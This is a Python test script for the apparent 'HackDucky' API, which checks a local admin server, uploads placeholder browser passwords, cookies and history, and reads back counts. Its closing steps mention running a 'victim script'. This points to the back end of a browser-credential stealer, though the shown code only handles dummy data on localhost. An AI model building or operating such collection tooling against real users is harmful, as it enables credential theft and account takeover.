"""
Test script for HackDucky API
Demonstrates how to upload data and retrieve information via the API
"""

import requests
import json
import sys

# API base URL
API_BASE = "http://localhost:8000/api"

def test_api_status():
    print("Testing API status...")
    try:
        response = requests.get(f"{API_BASE}/status/")
        if response.status_code == 200:
            data = response.json()
            print("API is running!")
            print(f"Database stats: {data['data']}")
            return True
        else:
            print(f"API status failed: {response.status_code}")
            return False
    except requests.exceptions.ConnectionError:
        print("Could not connect to API. Make sure the admin server is running.")
        return False

def test_data_upload():
    """Test uploading sample data"""
    print("\nTesting data upload...")
    
    sample_data = {
        "profiles": [
            {
                "name": "Test Profile",
                "browser_type": "Chrome",
                "passwords": [
                    {
                        "url": "https://example.com",
                        "username": "test@example.com",
                        "password": "test_password_123"
                    }
                ],
                "cookies": [
                    {
                        "name": "session_id",
                        "host_key": "example.com",
                        "value": "abc123",
                        "is_secure": True,
                        "is_httponly": True,
                        "creation_utc": 1234567890,
                        "expires_utc": 1234567890,
                        "last_access_utc": 1234567890,
                        "path": "/",
                        "top_frame_site_key": "",
                        "encrypted_value": "",
                        "has_expires": True,
                        "is_persistent": True,
                        "priority": 1,
                        "samesite": 0,
                        "source_scheme": 1,
                        "source_port": 443,
                        "is_same_party": False,
                        "last_update_utc": 1234567890,
                        "is_edgelegacycookie": False,
                        "browser_provenance": 0
                    }
                ],
                "history": [
                    {
                        "url": "https://example.com",
                        "title": "Example Domain",
                        "visit_count": 1,
                        "last_visit_time": 1234567890
                    }
                ]
            }
        ]
    }
    
    try:
        response = requests.post(
            f"{API_BASE}/upload/",
            json=sample_data,
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 201:
            result = response.json()
            print(f"Upload successful! {result['message']}")
            return True
        else:
            print(f"Upload failed: {response.status_code}")
            print(f"Response: {response.text}")
            return False
    except Exception as e:
        print(f"Upload error: {str(e)}")
        return False

def test_data_retrieval():
    print("\n📥 Testing data retrieval...")
    
    endpoints = [
        ("profiles", "Browser Profiles"),
        ("passwords", "Passwords"),
        ("cookies", "Cookies"),
        ("history", "History")
    ]
    
    for endpoint, name in endpoints:
        try:
            response = requests.get(f"{API_BASE}/{endpoint}/")
            if response.status_code == 200:
                data = response.json()
                count = data.get('count', 0)
                print(f"{name}: {count} items")
            else:
                print(f"{name}: Failed ({response.status_code})")
        except Exception as e:
            print(f"{name}: Error - {str(e)}")

def main():
    print("HackDucky API Test")
    print("=" * 40)
    
    if not test_api_status():
        print("\nAPI is not available. Please start the admin server first:")
        print("   python main.py admin")
        sys.exit(1)
    
    test_data_upload()
    
    test_data_retrieval()
    
    print("\n🎉 API test completed!")
    print("\n📋 Next steps:")
    print("1. Run the victim script: python main.py victim")
    print("2. Check the web interface: http://localhost:8000")
    print("3. View API docs: http://localhost:8000/api-docs/")

if __name__ == "__main__":
    main()